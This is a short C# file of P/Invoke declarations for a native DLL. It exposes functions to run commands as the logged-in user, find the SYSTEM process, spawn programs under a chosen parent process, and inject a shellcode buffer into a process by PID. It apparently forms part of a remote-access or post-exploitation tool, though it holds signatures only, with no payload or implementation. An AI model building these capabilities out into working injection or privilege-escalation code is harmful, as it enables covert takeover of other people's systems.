using System;
using System.Runtime.InteropServices;

public class NativeMethods
{
    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int ReadFromPipe(IntPtr hRead, byte[] outputBuffer, int bufferSize);

    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int RunAsLoggedInUser([MarshalAs(UnmanagedType.LPWStr)] string command, out IntPtr hRead);

    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern uint GetSystemPID();

    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int SpawnSystem(
            int parentId, 
            [MarshalAs(UnmanagedType.LPWStr)] string appName,
            [MarshalAs(UnmanagedType.LPWStr)] string argument
    );
    
    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    public static extern int Inject(int procPID, byte[] shellcode, UIntPtr shellcodeSize);
  
    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr getResolution();

}

